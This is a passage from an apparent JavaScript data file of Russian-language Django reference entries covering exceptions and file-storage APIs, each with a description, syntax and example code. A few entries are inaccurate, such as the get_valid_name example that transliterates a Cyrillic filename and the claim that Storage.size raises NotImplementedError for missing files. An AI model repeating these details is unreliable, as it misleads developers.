    name: "ValidationError",
    category: "Django Exceptions",
    description:
      "Возникает при неудачной проверке данных в формах, полях модели или валидаторах. Содержит сообщение об ошибке, код ошибки и параметры для форматирования. Используется как в формах Django, так и в методе Model.full_clean().",
    syntax: "ValidationError(message, code=None, params=None)",
    arguments: [
      {
        name: "message",
        description:
          "Сообщение об ошибке. Может быть строкой, экземпляром lazy-перевода, списком или словарём сообщений.",
      },
      {
        name: "code",
        description:
          'Код ошибки — строковый идентификатор типа ошибки (например, "required", "invalid"). Используется для программной обработки ошибок.',
      },
      {
        name: "params",
        description:
          "Словарь параметров для подстановки в строку сообщения через форматирование. Позволяет создавать динамические сообщения об ошибках.",
      },
    ],
    example: `from django.core.exceptions import ValidationError

def validate_positive(value):
    if value <= 0:
        raise ValidationError(
            "Значение %(value)s должно быть положительным.",
            code='invalid',
            params={'value': value}
        )

# Использование в модели
from django.db import models

class Product(models.Model):
    price = models.DecimalField(
        max_digits=10,
        decimal_places=2,
        validators=[validate_positive]
    )`,
  },
  {
    name: "BadRequest",
    category: "Django Exceptions",
    description:
      "Возникает для обозначения некорректного HTTP-запроса. Django автоматически возвращает ответ 400 Bad Request при перехвате этого исключения в представлении. Используется для явного отклонения запросов с неверными данными.",
    syntax: "from django.core.exceptions import BadRequest",
    arguments: [],
    example: `from django.core.exceptions import BadRequest

def my_view(request):
    value = request.GET.get('count')
    if value is not None:
        try:
            count = int(value)
        except ValueError:
            raise BadRequest("Параметр 'count' должен быть целым числом")
    # дальнейшая логика представления`,
  },
  {
    name: "RequestAborted",
    category: "Django Exceptions",
    description:
      "Возникает, когда HTTP-соединение было разорвано клиентом в процессе обработки запроса. Django использует это исключение внутри себя для корректного завершения обработки прерванных запросов, например при потоковой передаче данных.",
    syntax:
      "from django.http import UnreadablePostError  # связанное исключение\n# RequestAborted находится в django.core.handlers.exception",
    arguments: [],
    example: `# Django вызывает это исключение автоматически внутри обработчика.
# Пример перехвата в собственном middleware:

class AbortHandlerMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        try:
            return self.get_response(request)
        except Exception as e:
            if e.__class__.__name__ == 'RequestAborted':
                # Клиент разорвал соединение — тихо завершаем
                return None
            raise`,
  },
  {
    name: "SynchronousOnlyOperation",
    category: "Django Exceptions",
    description:
      "Возникает при попытке вызвать синхронную операцию Django (например, запрос к ORM) из асинхронного контекста без соответствующей обёртки. Защищает от случайных блокировок event loop при смешивании синхронного и асинхронного кода.",
    syntax: "from django.core.exceptions import SynchronousOnlyOperation",
    arguments: [],
    example: `import asyncio
from django.core.exceptions import SynchronousOnlyOperation

async def bad_async_view(request):
    try:
        # Нельзя вызывать ORM напрямую из async-функции
        from myapp.models import Article
        article = Article.objects.get(pk=1)
    except SynchronousOnlyOperation:
        print("Используйте sync_to_async для ORM-запросов в async-коде")

# Правильный способ:
from asgiref.sync import sync_to_async

async def good_async_view(request):
    get_article = sync_to_async(lambda: Article.objects.get(pk=1))
    article = await get_article()`,
  },
  {
    name: "Resolver404",
    category: "Django Exceptions",
    description:
      "Возникает в функции resolve() модуля django.urls, когда переданный путь не совпадает ни с одним URL-шаблоном из urlconf. Используется внутри Django для генерации ответа 404 Not Found.",
    syntax: "from django.urls import Resolver404",
    arguments: [],
    example: `from django.urls import resolve, Resolver404

def check_url(path):
    try:
        match = resolve(path)
        print(f"Найдено представление: {match.func.__name__}")
    except Resolver404:
        print(f"Маршрут '{path}' не найден в urlconf")`,
  },
  {
    name: "NoReverseMatch",
    category: "Django Exceptions",
    description:
      "Возникает в функции reverse() или теге {% url %} шаблона, когда не удаётся построить URL по имени маршрута и переданным аргументам. Указывает на несоответствие имени маршрута или переданных параметров.",
    syntax: "from django.urls import NoReverseMatch",
    arguments: [],
    example: `from django.urls import reverse, NoReverseMatch

try:
    url = reverse('article-detail', kwargs={'pk': 42})
    print(f"URL: {url}")
except NoReverseMatch as e:
    print(f"Не удалось построить URL: {e}")`,
  },
  {
    name: "Error",
    category: "Django Exceptions",
    description:
      "Базовый класс для всех исключений базы данных в Django DB API. Наследуется от стандартного Exception. Все остальные исключения, связанные с БД (DatabaseError, IntegrityError и др.), являются его подклассами.",
    syntax: "from django.db import Error",
    arguments: [],
    example: `from django.db import Error

try:
    from myapp.models import Article
    Article.objects.create(title="Тест")
except Error as e:
    print(f"Произошла ошибка базы данных: {e}")`,
  },
  {
    name: "InterfaceError",
    category: "Django Exceptions",
    description:
      "Возникает при ошибках, связанных с интерфейсом базы данных, а не с самой БД. Например, при попытке использовать уже закрытое соединение или курсор. Соответствует InterfaceError из DB-API 2.0 (PEP 249).",
    syntax: "from django.db import InterfaceError",
    arguments: [],
    example: `from django.db import InterfaceError
from django.db import connection

try:
    cursor = connection.cursor()
    connection.close()
    # Попытка использовать курсор после закрытия соединения
    cursor.execute("SELECT 1")
except InterfaceError as e:
    print(f"Ошибка интерфейса БД: {e}")`,
  },
  {
    name: "DatabaseError",
    category: "Django Exceptions",
    description:
      "Базовый класс для исключений, связанных с ошибками самой базы данных. Все специфические ошибки БД (DataError, OperationalError, IntegrityError и др.) являются его подклассами. Соответствует DatabaseError из DB-API 2.0.",
    syntax: "from django.db import DatabaseError",
    arguments: [],
    example: `from django.db import DatabaseError

try:
    from myapp.models import Article
    Article.objects.raw("INVALID SQL QUERY")[0]
except DatabaseError as e:
    print(f"Ошибка базы данных: {e}")`,
  },
  {
    name: "DataError",
    category: "Django Exceptions",
    description:
      "Возникает при ошибках, связанных с некорректными данными — например, при попытке записать значение, выходящее за пределы допустимого диапазона поля, или строку, превышающую максимальную длину. Соответствует DataError из DB-API 2.0.",
    syntax: "from django.db import DataError",
    arguments: [],
    example: `from django.db import DataError

try:
    from myapp.models import Article
    # Попытка сохранить строку длиннее допустимого значения поля
    Article.objects.create(title="A" * 10000)
except DataError as e:
    print(f"Некорректные данные: {e}")`,
  },
  {
    name: "OperationalError",
    category: "Django Exceptions",
    description:
      "Возникает при операционных ошибках базы данных, не зависящих от программиста: потеря соединения, тайм-аут, сбой сервера БД. Соответствует OperationalError из DB-API 2.0. Часто требует повторной попытки операции.",
    syntax: "from django.db import OperationalError",
    arguments: [],
    example: `from django.db import OperationalError

def safe_query():
    try:
        from myapp.models import Article
        return Article.objects.all().count()
    except OperationalError as e:
        print(f"Операционная ошибка БД (соединение?): {e}")
        return None`,
  },
  {
    name: "IntegrityError",
    category: "Django Exceptions",
    description:
      "Возникает при нарушении ограничений целостности базы данных: попытка вставить дублирующееся значение уникального поля, нарушение ограничения внешнего ключа или NOT NULL. Соответствует IntegrityError из DB-API 2.0.",
    syntax: "from django.db import IntegrityError",
    arguments: [],
    example: `from django.db import IntegrityError

try:
    from myapp.models import User
    # email помечен как unique=True
    User.objects.create(email="existing@example.com")
    User.objects.create(email="existing@example.com")
except IntegrityError as e:
    print(f"Нарушение уникальности: {e}")`,
  },
  {
    name: "InternalError",
    category: "Django Exceptions",
    description:
      "Возникает при внутренних ошибках базы данных, например при невалидном состоянии курсора или транзакции. Соответствует InternalError из DB-API 2.0. Как правило, указывает на ошибку в логике управления транзакциями.",
    syntax: "from django.db import InternalError",
    arguments: [],
    example: `from django.db import InternalError, transaction

try:
    with transaction.atomic():
        from myapp.models import Article
        Article.objects.create(title="Тест")
        # Выполнение недопустимой операции внутри транзакции
        raise InternalError("Недопустимое состояние транзакции")
except InternalError as e:
    print(f"Внутренняя ошибка БД: {e}")`,
  },
  {
    name: "ProgrammingError",
    category: "Django Exceptions",
    description:
      "Возникает при программных ошибках работы с БД: некорректный SQL-запрос, обращение к несуществующей таблице или столбцу, неверное количество параметров. Соответствует ProgrammingError из DB-API 2.0.",
    syntax: "from django.db import ProgrammingError",
    arguments: [],
    example: `from django.db import ProgrammingError, connection

try:
    with connection.cursor() as cursor:
        # Запрос к несуществующей таблице
        cursor.execute("SELECT * FROM nonexistent_table")
except ProgrammingError as e:
    print(f"Ошибка SQL-запроса: {e}")`,
  },
  {
    name: "NotSupportedError",
    category: "Django Exceptions",
    description:
      "Возникает при попытке использовать метод или функцию, которые не поддерживаются данным бэкендом базы данных. Например, при использовании специфичной для PostgreSQL функции в SQLite. Соответствует NotSupportedError из DB-API 2.0.",
    syntax: "from django.db import NotSupportedError",
    arguments: [],
    example: `from django.db import NotSupportedError

try:
    from myapp.models import Article
    # Некоторые возможности доступны только в определённых БД
    qs = Article.objects.all().explain()
except NotSupportedError as e:
    print(f"Операция не поддерживается текущей БД: {e}")`,
  },
  {
    name: "ProtectedError",
    category: "Django Exceptions",
    description:
      "Возникает при попытке удалить объект, на который ссылаются другие объекты через ForeignKey с параметром on_delete=PROTECT. Содержит атрибуты protected_objects — набор объектов, заблокировавших удаление.",
    syntax: "from django.db.models import ProtectedError",
    arguments: [],
    example: `from django.db.models import ProtectedError

try:
    from myapp.models import Author, Article
    # Article.author = ForeignKey(Author, on_delete=PROTECT)
    author = Author.objects.get(pk=1)
    author.delete()
except ProtectedError as e:
    print(f"Нельзя удалить: объект используется")
    print(f"Защищённые объекты: {e.protected_objects}")`,
  },
  {
    name: "RestrictedError",
    category: "Django Exceptions",
    description:
      "Возникает при попытке удалить объект, на который ссылаются другие объекты через ForeignKey с параметром on_delete=RESTRICT. В отличие от PROTECT, RESTRICT допускает удаление, если связанные объекты также удаляются в той же операции.",
    syntax: "from django.db.models import RestrictedError",
    arguments: [],
    example: `from django.db.models import RestrictedError

try:
    from myapp.models import Publisher, Book
    # Book.publisher = ForeignKey(Publisher, on_delete=RESTRICT)
    publisher = Publisher.objects.get(pk=1)
    publisher.delete()
except RestrictedError as e:
    print(f"Удаление ограничено: {e.restricted_objects}")`,
  },
  {
    name: "UnreadablePostError",
    category: "Django Exceptions",
    description:
      "Возникает при чтении данных POST-запроса, если клиент разорвал соединение до завершения передачи тела запроса. Django генерирует это исключение при обращении к request.POST или request.FILES для незавершённых загрузок.",
    syntax: "from django.http import UnreadablePostError",
    arguments: [],
    example: `from django.http import UnreadablePostError

def upload_view(request):
    try:
        # Чтение данных формы или файла
        file = request.FILES.get('document')
        if file:
            content = file.read()
    except UnreadablePostError:
        # Клиент прервал загрузку
        return HttpResponse("Загрузка прервана", status=400)`,
  },
  {
    name: "SessionInterrupted",
    category: "Django Exceptions",
    description:
      "Возникает при сбое во время работы с сессией, когда сессионные данные не могут быть корректно прочитаны или сохранены. Обычно означает повреждение данных сессии или несовместимость её формата.",
    syntax: "from django.contrib.sessions.exceptions import SessionInterrupted",
    arguments: [],
    example: `from django.contrib.sessions.exceptions import SessionInterrupted

def session_view(request):
    try:
        user_data = request.session['user_data']
    except SessionInterrupted:
        # Сессия повреждена — сбрасываем её
        request.session.flush()
        print("Сессия была прервана и сброшена")`,
  },
  {
    name: "TransactionManagementError",
    category: "Django Exceptions",
    description:
      "Возникает при ошибках управления транзакциями: попытка выполнить запрос в сломанной транзакции, некорректная вложенность savepoint, или нарушение правил атомарных блоков. Указывает на проблемы в логике работы с транзакциями.",
    syntax: "from django.db import TransactionManagementError",
    arguments: [],
    example: `from django.db import TransactionManagementError, transaction

try:
    with transaction.atomic():
        from myapp.models import Article
        Article.objects.create(title="Статья 1")
        try:
            with transaction.atomic():
                Article.objects.create(title=None)  # нарушение NOT NULL
        except Exception:
            pass  # транзакция помечена как "сломанная"
        # Следующий запрос вызовет TransactionManagementError
        Article.objects.create(title="Статья 2")
except TransactionManagementError as e:
    print(f"Ошибка управления транзакцией: {e}")`,
  },
  {
    name: "RedirectCycleError",
    category: "Django Exceptions",
    description:
      "Возникает в CommonMiddleware или RedirectFallbackMiddleware при обнаружении цикла перенаправлений — когда URL перенаправляет на самого себя или образует кольцо редиректов. Предотвращает бесконечные циклы перенаправлений.",
    syntax: "from django.middleware.common import RedirectCycleError",
    arguments: [],
    example: `from django.middleware.common import RedirectCycleError

# Пример возникновения: если APPEND_SLASH=True и URL
# /about/ перенаправляет обратно на /about/ или цикл
# /a/ -> /b/ -> /a/

# Перехват в собственном middleware:
class SafeRedirectMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        try:
            return self.get_response(request)
        except RedirectCycleError as e:
            print(f"Обнаружен цикл редиректов: {e.final_response}")
            raise`,
  },
  {
    name: "File(file_object, name=None)",
    category: "File handling",
    description:
      "Базовый класс Django для работы с файлами. Оборачивает стандартный файловый объект Python, добавляя дополнительные атрибуты и методы, необходимые для работы с файловым хранилищем Django. Используется как основа для ContentFile и ImageFile.",
    syntax:
      "from django.core.files import File\n\nf = File(file_object, name=None)",
    arguments: [
      {
        name: "file_object",
        description:
          "Стандартный файловый объект Python, открытый в режиме чтения или записи.",
      },
      {
        name: "name",
        description:
          "Имя файла. Если не указано, берётся из атрибута name файлового объекта.",
      },
    ],
    example: `from django.core.files import File

# Открываем файл и оборачиваем в File
with open('/tmp/example.txt', 'w') as f:
    my_file = File(f, name='example.txt')
    print(my_file.name)   # 'example.txt'
    print(my_file.mode)   # 'w'`,
  },
  {
    name: "File.name",
    category: "File handling",
    description:
      "Атрибут, содержащий имя файла, включая относительный путь от корня файлового хранилища. Если файл был создан без имени, значение может быть пустой строкой или None.",
    syntax: "file.name",
    arguments: [],
    example: `from django.core.files import File

with open('/tmp/report.pdf', 'rb') as f:
    my_file = File(f, name='reports/report.pdf')
    print(my_file.name)  # 'reports/report.pdf'`,
  },
  {
    name: "File.size",
    category: "File handling",
    description:
      "Атрибут, возвращающий размер файла в байтах. Для файлов на диске использует os.path.getsize(). Для файлов в памяти (ContentFile) возвращает длину содержимого.",
    syntax: "file.size",
    arguments: [],
    example: `from django.core.files import File

with open('/tmp/document.txt', 'rb') as f:
    my_file = File(f)
    print(my_file.size)  # размер в байтах, например 1024`,
  },
  {
    name: "File.file",
    category: "File handling",
    description:
      "Атрибут, предоставляющий доступ к исходному файловому объекту Python, который лежит в основе экземпляра File. Позволяет использовать низкоуровневые методы стандартного файлового объекта.",
    syntax: "file.file",
    arguments: [],
    example: `from django.core.files import File

with open('/tmp/data.txt', 'rb') as f:
    my_file = File(f)
    # Доступ к исходному файловому объекту
    raw = my_file.file
    print(type(raw))   # <class '_io.BufferedReader'>
    raw.seek(0)
    content = raw.read()`,
  },
  {
    name: "File.mode",
    category: "File handling",
    description:
      'Атрибут, возвращающий режим открытия файла: "rb", "wb", "r", "w" и т. д. Берётся из атрибута mode исходного файлового объекта.',
    syntax: "file.mode",
    arguments: [],
    example: `from django.core.files import File

with open('/tmp/image.png', 'rb') as f:
    my_file = File(f)
    print(my_file.mode)  # 'rb'`,
  },
  {
    name: "File.open(mode=None, *args, **kwargs)",
    category: "File handling",
    description:
      "Открывает или повторно открывает файл в указанном режиме. Если файл уже открыт, выполняет seek(0). Может использоваться как контекстный менеджер. Полезно для повторного открытия файла после его закрытия или для смены режима доступа.",
    syntax: "file.open(mode=None, *args, **kwargs)",
    arguments: [
      {
        name: "mode",
        description:
          'Режим открытия файла: "rb", "wb", "r", "w" и др. Если None — использует текущий режим файла.',
      },
      {
        name: "*args, **kwargs",
        description: "Дополнительные аргументы, передаваемые функции open().",
      },
    ],
    example: `from django.core.files import File

with open('/tmp/sample.txt', 'rb') as f:
    my_file = File(f)

    # Использование как контекстного менеджера
    with my_file.open('rb') as opened:
        data = opened.read()
        print(data)`,
  },
  {
    name: "File.__iter__()",
    category: "File handling",
    description:
      "Позволяет итерироваться по файлу построчно с помощью цикла for. Каждая итерация возвращает одну строку файла в виде байтовой строки (bytes) или строки (str) в зависимости от режима открытия.",
    syntax: "for line in file:\n    ...",
    arguments: [],
    example: `from django.core.files import File

with open('/tmp/log.txt', 'r') as f:
    my_file = File(f)
    for line in my_file:
        print(line.strip())`,
  },
  {
    name: "File.chunks(chunk_size=None)",
    category: "File handling",
    description:
      "Генератор, который читает файл частями (чанками) указанного размера. Используется для эффективной обработки больших файлов без загрузки всего содержимого в память. По умолчанию размер чанка — 64 КБ.",
    syntax: "file.chunks(chunk_size=None)",
    arguments: [
      {
        name: "chunk_size",
        description:
          "Размер одного чанка в байтах. По умолчанию File.DEFAULT_CHUNK_SIZE = 65536 (64 КБ).",
      },
    ],
    example: `from django.core.files import File

with open('/tmp/large_file.bin', 'rb') as f:
    my_file = File(f)
    total = 0
    for chunk in my_file.chunks(chunk_size=8192):
        total += len(chunk)
        # обработка чанка, например запись в другой файл
    print(f"Прочитано байт: {total}")`,
  },
  {
    name: "File.multiple_chunks(chunk_size=None)",
    category: "File handling",
    description:
      "Возвращает True, если файл достаточно велик, чтобы потребовать нескольких чанков при чтении с указанным chunk_size. Используется для определения стратегии обработки: читать целиком или по частям.",
    syntax: "file.multiple_chunks(chunk_size=None)",
    arguments: [
      {
        name: "chunk_size",
        description:
          "Размер чанка в байтах для сравнения с размером файла. По умолчанию File.DEFAULT_CHUNK_SIZE = 65536 (64 КБ).",
      },
    ],
    example: `from django.core.files import File

with open('/tmp/document.pdf', 'rb') as f:
    my_file = File(f)
    if my_file.multiple_chunks():
        # Файл большой — читаем по частям
        for chunk in my_file.chunks():
            process(chunk)
    else:
        # Файл маленький — читаем целиком
        content = my_file.read()`,
  },
  {
    name: "File.close()",
    category: "File handling",
    description:
      "Закрывает файловый объект, освобождая связанные с ним ресурсы. После вызова close() обращение к файлу вызовет ошибку. Рекомендуется использовать конструкцию with для автоматического закрытия.",
    syntax: "file.close()",
    arguments: [],
    example: `from django.core.files import File

f = open('/tmp/data.txt', 'rb')
my_file = File(f)

try:
    content = my_file.read()
finally:
    my_file.close()  # гарантированное закрытие`,
  },
  {
    name: "ContentFile(content, name=None)",
    category: "File handling",
    description:
      'Подкласс File, хранящий содержимое файла в памяти, а не на диске. Принимает строку или байты и предоставляет файловый интерфейс. Удобен для создания файлов "на лету" без записи на диск, например при генерации файлов в представлениях.',
    syntax:
      "from django.core.files.base import ContentFile\n\nf = ContentFile(content, name=None)",
    arguments: [
      {
        name: "content",
        description: "Содержимое файла в виде строки (str) или байтов (bytes).",
      },
      {
        name: "name",
        description:
          "Имя файла. Необязательный параметр, используется при сохранении в хранилище.",
      },
    ],
    example: `from django.core.files.base import ContentFile

# Создание текстового файла в памяти
text_file = ContentFile("Hello, Django!", name="hello.txt")
print(text_file.size)   # 14

# Создание бинарного файла в памяти
binary_file = ContentFile(b"\\x89PNG...", name="image.png")

# Сохранение в поле FileField модели
from myapp.models import Document
doc = Document()
doc.file.save("hello.txt", text_file, save=True)`,
  },
  {
    name: "ImageFile(file_object, name=None)",
    category: "File handling",
    description:
      "Подкласс File, предназначенный для работы с изображениями. Добавляет атрибуты width и height, которые возвращают размеры изображения. Используется полем ImageField модели Django. Требует установленной библиотеки Pillow.",
    syntax:
      "from django.core.files.images import ImageFile\n\nf = ImageFile(file_object, name=None)",
    arguments: [
      {
        name: "file_object",
        description:
          "Файловый объект, содержащий изображение в поддерживаемом формате (JPEG, PNG, GIF и др.).",
      },
      {
        name: "name",
        description: "Имя файла изображения. Необязательный параметр.",
      },
    ],
    example: `from django.core.files.images import ImageFile

with open('/tmp/photo.jpg', 'rb') as f:
    img = ImageFile(f, name='photo.jpg')
    print(img.width)   # ширина в пикселях, например 1920
    print(img.height)  # высота в пикселях, например 1080`,
  },
  {
    name: "ImageFile.width",
    category: "File handling",
    description:
      "Атрибут, возвращающий ширину изображения в пикселях. Вычисляется при первом обращении с помощью библиотеки Pillow. Используется автоматически полем ImageField при указании параметров width_field.",
    syntax: "image_file.width",
    arguments: [],
    example: `from django.core.files.images import ImageFile

with open('/tmp/banner.png', 'rb') as f:
    img = ImageFile(f)
    print(f"Ширина: {img.width}px")  # например: Ширина: 1200px`,
  },
  {
    name: "ImageFile.height",
    category: "File handling",
    description:
      "Атрибут, возвращающий высоту изображения в пикселях. Вычисляется при первом обращении с помощью библиотеки Pillow. Используется автоматически полем ImageField при указании параметров height_field.",
    syntax: "image_file.height",
    arguments: [],
    example: `from django.core.files.images import ImageFile

with open('/tmp/banner.png', 'rb') as f:
    img = ImageFile(f)
    print(f"Высота: {img.height}px")  # например: Высота: 400px`,
  },
  {
    name: "File.save(name, content, save=True)",
    category: "File handling",
    description:
      "Метод файлового дескриптора поля FileField/ImageField модели. Сохраняет файл в хранилище под указанным именем и при необходимости сразу сохраняет экземпляр модели. Автоматически генерирует уникальное имя файла при конфликтах.",
    syntax: "instance.field.save(name, content, save=True)",
    arguments: [
      {
        name: "name",
        description:
          "Желаемое имя файла. Хранилище может изменить его для обеспечения уникальности.",
      },
      {
        name: "content",
        description:
          "Объект File или ContentFile с содержимым файла для сохранения.",
      },
      {
        name: "save",
        description:
          "Если True (по умолчанию), автоматически вызывает instance.save() после сохранения файла.",
      },
    ],
    example: `from django.core.files.base import ContentFile
from myapp.models import UserProfile

profile = UserProfile.objects.get(pk=1)

# Создаём файл в памяти и сохраняем в поле
avatar_content = ContentFile(b"...binary image data...", name="avatar.jpg")
profile.avatar.save("avatar.jpg", avatar_content, save=True)

print(profile.avatar.url)   # URL сохранённого файла
print(profile.avatar.name)  # путь в хранилище`,
  },
  {
    name: "File.delete(save=True)",
    category: "File handling",
    description:
      "Метод файлового дескриптора поля FileField/ImageField модели. Удаляет связанный файл из хранилища и очищает значение поля. При save=True автоматически сохраняет экземпляр модели после удаления файла.",
    syntax: "instance.field.delete(save=True)",
    arguments: [
      {
        name: "save",
        description:
          "Если True (по умолчанию), автоматически вызывает instance.save() после удаления файла, чтобы очистить значение поля в базе данных.",
      },
    ],
    example: `from myapp.models import UserProfile

profile = UserProfile.objects.get(pk=1)

if profile.avatar:
    print(f"Удаляем файл: {profile.avatar.name}")
    # Удаляем файл из хранилища и обновляем запись в БД
    profile.avatar.delete(save=True)
    print(f"Поле после удаления: '{profile.avatar}'")  # ''`,
  },
  {
    name: "Storage.get_alternative_name(file_root, file_ext)",
    category: "File handling",
    description:
      "Возвращает альтернативное имя файла путём добавления случайного суффикса к корневому имени. Вызывается внутри get_available_name() при конфликте имён. Можно переопределить в собственном классе хранилища для изменения стратегии генерации уникальных имён.",
    syntax: "storage.get_alternative_name(file_root, file_ext)",
    arguments: [
      {
        name: "file_root",
        description: "Корневая часть имени файла — без расширения.",
      },
      {
        name: "file_ext",
        description: 'Расширение файла вместе с точкой, например ".jpg".',
      },
    ],
    example: `from django.core.files.storage import FileSystemStorage

storage = FileSystemStorage()

# Генерируем альтернативное имя при конфликте
alt_name = storage.get_alternative_name('photo', '.jpg')
print(alt_name)  # 'photo_5f3a2c.jpg' (суффикс случайный)`,
  },
  {
    name: "Storage.get_available_name(name, max_length=None)",
    category: "File handling",
    description:
      "Возвращает имя файла, доступное в хранилище. Если файл с таким именем уже существует, добавляет случайный суффикс через get_alternative_name() до получения уникального имени. Учитывает ограничение max_length для итогового имени.",
    syntax: "storage.get_available_name(name, max_length=None)",
    arguments: [
      { name: "name", description: "Желаемое имя файла." },
      {
        name: "max_length",
        description:
          "Максимально допустимая длина итогового имени файла. Если None — ограничений нет.",
      },
    ],
    example: `from django.core.files.storage import default_storage

# Получаем гарантированно уникальное имя
available = default_storage.get_available_name('uploads/photo.jpg')
print(available)
# 'uploads/photo.jpg' если файла нет
# 'uploads/photo_a3f9b1.jpg' если уже существует`,
  },
  {
    name: "Storage.get_created_time(name)",
    category: "File handling",
    description:
      "Возвращает объект datetime с временем создания файла. Время возвращается с учётом настройки USE_TZ: если USE_TZ=True, возвращается aware datetime в UTC. Не все бэкенды хранилища поддерживают эту операцию.",
    syntax: "storage.get_created_time(name)",
    arguments: [
      {
        name: "name",
        description: "Имя файла (относительный путь в хранилище).",
      },
    ],
    example: `from django.core.files.storage import default_storage

created_at = default_storage.get_created_time('uploads/document.pdf')
print(created_at)  # datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC)`,
  },
  {
    name: "Storage.get_modified_time(name)",
    category: "File handling",
    description:
      "Возвращает объект datetime с временем последнего изменения файла. Время возвращается с учётом настройки USE_TZ. Полезно для реализации кэширования на основе времени изменения файлов.",
    syntax: "storage.get_modified_time(name)",
    arguments: [
      {
        name: "name",
        description: "Имя файла (относительный путь в хранилище).",
      },
    ],
    example: `from django.core.files.storage import default_storage

modified_at = default_storage.get_modified_time('uploads/report.xlsx')
print(modified_at)  # datetime(2024, 5, 1, 14, 22, 37, tzinfo=UTC)

# Проверка актуальности кэша
from django.utils import timezone
age = timezone.now() - modified_at
print(f"Файл изменён {age.days} дней назад")`,
  },
  {
    name: "Storage.get_valid_name(name)",
    category: "File handling",
    description:
      "Возвращает корректное имя файла, пригодное для использования в конкретном хранилище. Удаляет или заменяет недопустимые символы. Базовая реализация заменяет пробелы на подчёркивания и удаляет все символы, кроме букв, цифр, дефисов и точек.",
    syntax: "storage.get_valid_name(name)",
    arguments: [
      {
        name: "name",
        description:
          "Исходное имя файла, которое нужно привести к допустимому виду.",
      },
    ],
    example: `from django.core.files.storage import FileSystemStorage

storage = FileSystemStorage()

print(storage.get_valid_name('Мой файл (2024).pdf'))
# 'my_file_2024.pdf'

print(storage.get_valid_name('report 2024-05-01.xlsx'))
# 'report_2024-05-01.xlsx'`,
  },
  {
    name: "Storage.generate_filename(filename)",
    category: "File handling",
    description:
      "Генерирует итоговое имя файла для хранилища: последовательно вызывает get_valid_name() для очистки имени, затем get_available_name() для обеспечения уникальности. Это точка входа, которую вызывает Django перед сохранением любого файла.",
    syntax: "storage.generate_filename(filename)",
    arguments: [
      {
        name: "filename",
        description:
          "Исходное имя файла, которое нужно обработать и сделать уникальным.",
      },
    ],
    example: `from django.core.files.storage import default_storage

# Получаем финальное имя, которое будет использовано при сохранении
final_name = default_storage.generate_filename('uploads/My Photo.JPG')
print(final_name)  # 'uploads/My_Photo.JPG' (или с суффиксом если существует)`,
  },
  {
    name: "Storage.listdir(path)",
    category: "File handling",
    description:
      "Возвращает содержимое указанной директории в хранилище в виде кортежа из двух списков: (directories, files). Первый список содержит имена поддиректорий, второй — имена файлов. Поведение зависит от реализации бэкенда хранилища.",
    syntax: "storage.listdir(path)",
    arguments: [
      {
        name: "path",
        description:
          "Путь к директории внутри хранилища, содержимое которой нужно получить.",
      },
    ],
    example: `from django.core.files.storage import default_storage

dirs, files = default_storage.listdir('uploads/')

print("Поддиректории:", dirs)
# ['avatars', 'documents', 'thumbnails']

print("Файлы:", files)
# ['readme.txt', 'config.json']

# Рекурсивный обход
for filename in files:
    path = f"uploads/{filename}"
    print(f"{path} — {default_storage.size(path)} байт")`,
  },
  {
    name: "Storage.open(name, mode='rb')",
    category: "File handling",
    description:
      "Открывает файл из хранилища и возвращает объект File. По умолчанию открывает в бинарном режиме чтения ('rb'). Поддерживает использование как контекстного менеджера для автоматического закрытия файла.",
    syntax: "storage.open(name, mode='rb')",
    arguments: [
      {
        name: "name",
        description: "Имя файла (путь относительно корня хранилища).",
      },
      {
        name: "mode",
        description:
          "Режим открытия файла. По умолчанию 'rb' (бинарное чтение).",
      },
    ],
    example: `from django.core.files.storage import default_storage

# Чтение файла из хранилища
with default_storage.open('uploads/report.pdf', 'rb') as f:
    content = f.read()
    print(f"Размер: {len(content)} байт")

# Запись в хранилище
with default_storage.open('uploads/output.txt', 'wb') as f:
    f.write(b"Hello, Storage!")`,
  },
  {
    name: "Storage.path(name)",
    category: "File handling",
    description:
      "Возвращает абсолютный путь к файлу в локальной файловой системе. Доступен только для хранилищ на основе локальной ФС (FileSystemStorage). Для удалённых хранилищ (S3 и др.) вызывает NotImplementedError.",
    syntax: "storage.path(name)",
    arguments: [
      {
        name: "name",
        description: "Имя файла (относительный путь в хранилище).",
      },
    ],
    example: `from django.core.files.storage import default_storage

# Получаем абсолютный путь (только для FileSystemStorage)
abs_path = default_storage.path('uploads/document.pdf')
print(abs_path)
# '/home/user/project/media/uploads/document.pdf'

import os
print(os.path.exists(abs_path))  # True`,
  },
  {
    name: "Storage.save(name, content, max_length=None)",
    category: "File handling",
    description:
      "Сохраняет новый файл в хранилище, используя содержимое объекта content. Если файл с таким именем уже существует, автоматически генерирует уникальное имя. Возвращает фактическое имя, под которым файл был сохранён.",
    syntax: "storage.save(name, content, max_length=None)",
    arguments: [
      { name: "name", description: "Желаемое имя файла для сохранения." },
      {
        name: "content",
        description: "Объект File или ContentFile с содержимым файла.",
      },
      {
        name: "max_length",
        description:
          "Максимальная длина итогового имени файла. Передаётся в get_available_name().",
      },
    ],
    example: `from django.core.files.base import ContentFile
from django.core.files.storage import default_storage

# Сохраняем файл в хранилище
content = ContentFile(b"PDF content here", name="report.pdf")
saved_name = default_storage.save('uploads/report.pdf', content)

print(saved_name)
# 'uploads/report.pdf' или 'uploads/report_a3f9.pdf' при конфликте

print(default_storage.url(saved_name))
# '/media/uploads/report.pdf'`,
  },
  {
    name: "Storage.size(name)",
    category: "File handling",
    description:
      "Возвращает размер файла в байтах. Если файл не существует или хранилище не поддерживает эту операцию, вызывает NotImplementedError. Используется для валидации загружаемых файлов и отображения информации.",
    syntax: "storage.size(name)",
    arguments: [
      {
        name: "name",
        description: "Имя файла (относительный путь в хранилище).",
      },
    ],
    example: `from django.core.files.storage import default_storage

file_size = default_storage.size('uploads/video.mp4')
print(f"Размер: {file_size} байт")

# Форматирование для отображения
def human_size(size):
    for unit in ['Б', 'КБ', 'МБ', 'ГБ']:
        if size < 1024:
            return f"{size:.1f} {unit}"
        size /= 1024

print(human_size(file_size))  # например: '15.3 МБ'`,
  },
  {
    name: "Storage.url(name)",
    category: "File handling",
    description:
      "Возвращает URL, по которому можно получить доступ к файлу через HTTP. Для FileSystemStorage формирует URL на основе MEDIA_URL. Для облачных хранилищ (S3, GCS и др.) возвращает публичный или подписанный URL. Используется в шаблонах для отображения ссылок на файлы.",
    syntax: "storage.url(name)",
    arguments: [
      {
        name: "name",
        description: "Имя файла (относительный путь в хранилище).",
      },
    ],
    example: `from django.core.files.storage import default_storage

url = default_storage.url('uploads/photo.jpg')
